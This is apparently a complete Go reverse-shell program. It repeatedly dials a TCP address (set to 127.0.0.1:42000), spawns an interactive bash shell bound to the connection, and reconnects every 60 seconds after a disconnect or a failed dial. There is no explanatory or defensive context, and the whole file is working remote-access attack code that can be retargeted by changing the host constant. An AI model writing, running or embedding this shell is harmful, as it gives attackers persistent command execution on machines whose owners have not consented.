package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"
	"time"
)

const HOST = "127.0.0.1"
const PORT = 42000

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("/bin/bash", "-i")
	rp, wp := io.Pipe()
	defer rp.Close()
	defer wp.Close()

	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)

	cmd.Run()
}

func main() {
	address := fmt.Sprintf("%s:%d", HOST, PORT)

	conn, err := net.Dial("tcp4", address)
	if err != nil {
		fmt.Println("sleeping 60")
		time.Sleep(time.Second * 60)
		main()
	}

	handle(conn)
	fmt.Println("donee")
	time.Sleep(time.Second * 5)
	conn.Close()

	time.Sleep(time.Second * 60)
	main()
}
